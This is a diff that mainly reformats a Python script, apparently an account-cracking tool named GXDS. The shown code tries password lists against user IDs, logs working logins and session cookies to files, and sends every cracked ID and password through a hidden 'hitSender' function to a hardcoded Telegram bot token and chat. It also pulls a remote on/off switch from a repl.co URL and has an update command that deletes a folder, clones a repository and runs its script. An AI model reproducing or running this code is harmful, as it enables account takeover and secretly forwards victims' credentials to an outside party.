@@ -135,8 +135,10 @@ def lxnes():
     print(f"{dg}  ——————————————————————————————————————————————————")
     print(f"{dg}  ——————————————————————————————————————————————————")
 
+
 def lxnes1():
     print(f"{dg}  ——————————————————————————————————————————————————")
+
 
 lxgo = f"""{lg}
 
@@ -328,18 +330,22 @@ def apprxval():
             "cd ; rm -rf gxds ; git clone https://github.com/goxdies/gxds; cd gxds ; python x.py"
         )
 
+
 # MAINTENANCE CHECKER
 mxntenans = requests.get("https://arterxsk.repl.co/on.txt").text
+
+
 def mxntenansC():
-  gxdslogo()
-  print(f"{lgr}  [-] CHECKING SERVER STATUS")
-  slp(2)
-  print(f"{lgr}  [-] SERVER UPDATED")
-  if mxntenans == "on":
-    mxnu()
-  else:
-    systm("clear")
-    print(f"""{lr}
+    gxdslogo()
+    print(f"{lgr}  [-] CHECKING SERVER STATUS")
+    slp(2)
+    print(f"{lgr}  [-] SERVER UPDATED")
+    if mxntenans == "on":
+        mxnu()
+    else:
+        systm("clear")
+        print(
+            f"""{lr}
                 :::      :::::::      :::     
                :+:      :+:   :+:    :+:      
               +:+ +:+   +:+  :+:+   +:+ +:+   
@@ -349,8 +355,10 @@ def mxntenansC():
                   ###    #######        ### 
 {yellow}                     UNDER MAINTENANCE
 {dg}                          GXDS SINTACS
-    """)
-    exit()
+    """
+        )
+        exit()
+
 
 # MENU
 def mxnu():
@@ -384,6 +392,7 @@ def mxnu():
         gxdslogo()
         print(f"{lg}  [✘] OPTION:{dg} INVALID")
         mxnu()
+
 
 # GET COOKIES
 def xcokis():
@@ -461,8 +470,9 @@ def xcokis():
     except KeyboardInterrupt:
         sys.exit(f"{lr}  [✘] STOPPED!")
 
+
 # RESULT
-def result(oks,cps):
+def result(oks, cps):
     if len(oks) != 0 or len(cps) != 0:
         lxnes()
         print(f"{lgr}  [✓] CRACKING COMPLETED")
@@ -472,7 +482,8 @@ def result(oks,cps):
         lxnes()
         input(f"{dg}  [+] PRESS ENTER TO GO BACK")
         mxnu()
-        
+
+
 # FILE PATH
 def clxning():
     gxdslogo()
@@ -493,8 +504,8 @@ def clxning():
         slp(3)
         clxning()
     fxles(gxdsfiles)
-    
-    
+
+
 # FILE CLONING
 def fxles(gxdsfiles):
     slp(1)
@@ -549,14 +560,15 @@ def fxles(gxdsfiles):
                 pxss,
                 tl,
             )
-            
+
 
 # API
 def gxdsAPI(uid, pxss, tl):
     global oks, loop, cps, ugen
     session = requests.Session()
     sys.stdout.write(
-        f"\r{dg}  [GXDS]: %s/%s | CP: %s | HITS: %s \r" % (loop, tl, len(cps), len(oks))),
+        f"\r{dg}  [GXDS]: %s/%s | CP: %s | HITS: %s \r" % (loop, tl, len(cps), len(oks))
+    ),
     sys.stdout.flush()
     try:
         for ps in pxss:
@@ -611,10 +623,8 @@ def gxdsAPI(uid, pxss, tl):
                         for key, value in session.cookies.get_dict().items()
                     ]
                 )
-                print(
-                    f"""{lgr}  [GXDS HITS] {uid} : {ps} -\033[0;33m {yrs}"""
-                )
-                hitSender(uid,ps,yrs)
+                print(f"""{lgr}  [GXDS HITS] {uid} : {ps} -\033[0;33m {yrs}""")
+                hitSender(uid, ps, yrs)
                 open("/sdcard/gxds-ok.txt", "a").write(uid + "|" + ps + "\n")
                 open("/sdcard/gxds-cookies.txt", "a").write(coki + "\n")
                 oks.append(uid)
@@ -626,9 +636,7 @@ def gxdsAPI(uid, pxss, tl):
                         for key, value in session.cookies.get_dict().items()
                     ]
                 )
-                print(
-                    f"""{lr}  [GXDS X] {uid} : {ps} -\033[0;33m {yrs}"""
-                )
+                print(f"""{lr}  [GXDS X] {uid} : {ps} -\033[0;33m {yrs}""")
                 open("/sdcard/gxds-cp.txt", "a").write(uid + "|" + ps + "\n")
                 open("/sdcard/gxds-cookies.txt", "a").write(coki + "\n")
                 cps.append(uid)
@@ -638,16 +646,18 @@ def gxdsAPI(uid, pxss, tl):
         loop += 1
     except:
         pass
-        result(oks,cps)
+        result(oks, cps)
         exit()
+
 
 # HIT SENDER
 def hitSender(uid, ps, yrs):
-  TOKEN = "6475095868:AAHH2uGLGm5a9GswmkVor8Xn7Oz9OOMYg6o"
-  chat_id = "6542321044"
-  message = f"[GXDS HITS] {uid} : {ps} - {yrs}"
-  url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={message}"
-  hxts = (requests.get(url).json())
+    TOKEN = "6475095868:AAHH2uGLGm5a9GswmkVor8Xn7Oz9OOMYg6o"
+    chat_id = "6542321044"
+    message = f"[GXDS HITS] {uid} : {ps} - {yrs}"
+    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={message}"
+    hxts = requests.get(url).json()
+
 
 # FORWARDER
 def gxdsBot():
